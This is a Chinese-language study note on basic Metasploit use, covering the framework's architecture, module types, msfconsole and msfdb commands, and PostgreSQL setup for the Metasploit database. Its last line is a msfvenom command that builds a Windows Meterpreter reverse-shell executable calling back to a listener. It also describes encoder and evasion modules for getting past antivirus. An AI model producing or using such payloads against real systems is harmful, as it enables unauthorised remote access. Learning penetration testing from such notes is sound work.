# Metasploit简单使用

## Metasploit简介

- 目前最流行、最强大、最具扩展性的渗透测试平台软件。
- 基于Metasploit进行渗透测试和漏洞分析的流程和方法。
- 2003年由HD More发布第一版, 2007年用ruby语言重写，框架集成了渗透测试标准( PETS )思想，一定程度上统了渗透测试和漏洞研究的工作环境，新的攻击代码可以比较容易的加入框架。
- 开发活跃版本更新频繁(每周)，早期版本基于社区力量维护,被Rapid 7收购后打造出其商业版产品，目前分化为四个版本,社区版本依然十分活跃，HD More说:为Metasploit写书是种自虐!

## MSF架构

1. Rex：
   - 基本功能库;用于完成日常基本任务,无需人工手动编码实现
   - 处理socket连接访问、协议应答( http/SSL/SMB等)
   - 编码转换( XOR、Base64、 Unicode )
2. Msf::Core：
   - 提供Msf的核心基本API ,是框架的核心能力实现库
3. Msf::Base：
   - 提供友好的API接口,便于模块调用的库
4. Plugin插件：
   - 连接和调用外部扩展功能和系统

## 用户接口

1. 终端（Msfconsole），是Metasploit框架最受欢迎的用户接口，提供与用户交互式的输入，可以用它来做任何事情。
启动终端：在命令行里输入msfconsole即可。msf >
2. 命令行（msfcli），msfcli脚本处理和其他命令工具的互操作性。
3. Armitage，Metasploit框架中一个完全交互式的图形化用户接口。

## 模块

kali模块位置：/usr/share/metasploit-framework/modules/

技术功能模块(不是流程模块)

- Auxiliary：辅助模块：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块(没有payload的exploit模块)
- Encoders：对payload进行加密,躲避AV检查的模块
- evasion：规避模块：创建反杀毒软件的木马，逃避防火墙
- Exploits：进攻模块：利用系统漏洞进行攻击的动作,此模块对应每个具体漏洞的攻击方法(主动、被动)
- Nops：提高payload稳定性及维持大小
- Payload：进攻载荷：成功exploit之后,真正在目标系统执行的代码或指令：
  - Shellcode或系统命令
  - 三种Payload：/usr/share/metasploit-framework/modules/payloads/
  - Single：all-in-one
  - Stager：目标计算机内存有限时,先传输个较小的payload用于建立连接
  - Stages：利用stager建立的连接下载的后续payload
  - Stager、Stages都有多种类型 ,适用于不同场景
  - Shellcode是payload的种，由于其建立正向/反向shell而得名
- Post：后渗透进攻模块：后渗透Post模块的利用

## 终端（Msfconsole），命令

- msf 数据库的操作

```msf
msfdb init     # 启动并初始化数据库
msfdb reinit   # 删除并重新初始化数据库
msfdb delete   # 删除数据库并停止使用它
msfdb start    # 启动数据库
msfdb stop     # 停止数据库
msfdb status   # 检查服务状态
msfdb run      # 启动数据库并运行msfconsole

db_connect postgres:fake975686955.@localhost:5432/msf
```

- msf终端下常用命令

查看命令

```linux
msfconsole          # 打开msf终端
msfupdate           # 跟新msf，5用不了了，使用 apt update; apt install metasploit-framework
banner              # 显示msf的banner
help [db_connect]   # 显示命令的帮助信息
hosts               # 查看记录的主机信息
services            # 查看主机和开放端口信息
reload_all          # 从新加载模块
```

使用命令

```msf
search [module]     # 搜索含有关键字的模块
use [module]        # 选择使用一个模块(以ms17_010永恒之蓝为例)
show payload        # 显示该模块支持的payload
info                # 如果觉得show命令显示的不够完整可以直接输入info查看详细详细
exploit/run         # 两个命令都表示运行攻击模块
```

postgres数据库相关：

```psql
安装postgresql
yum install https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm
yum install postgresql12
yum install postgresql12-server

删除PostgreSQL用户密码
sudo passwd -d postgres

设置PostgreSQL用户密码
sudo -u postgres passwd

初始化postgresql
/usr/pgsql-12/bin/postgresql-12-setup initdb

启动
systemctl enable postgresql-12


开机启动
systemctl start postgresql-12

进入数据：如果不用postgres用户登陆，必须指定数据库
psql -d msf                         # 当前用户指定数据库登陆
sudo -u postgres psql               # 指定postgres用户登陆
sudo -u fake psql -d postgres   # 指定数据库登陆

修改PostgreSQL登录密码：
ALTER USER postgres WITH PASSWORD '****';


创建数据库新用户
CREATE USER 用户名 WITH PASSWORD '*****';

先删除用户对数据库的权限，在删除用户
revoke all on database msf from fake;
drop role fake;

创建数据库
CREATE DATABASE dbname;

列出所有用户
\du

查看所有数据库
\l

查看当前登陆的用户
select user;

授予用户数据库权限
GRANT ALL PRIVILEGES ON DATABASE 数据库名 TO 用户名;

授予用户查看刚授权的数据库的里面的表的权限
GRANT ALL PRIVILEGES ON TABLE 表名  TO 用户名;

psql: FATAL:  Peer authentication failed for user "postgres"
解决方法很简单，使用和pgsql用户相同的系统用户登录，
sudo -u postgres psql -U postgres
```

生成shell：msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.22.158 LPORT=4444 -f exe > shell.exe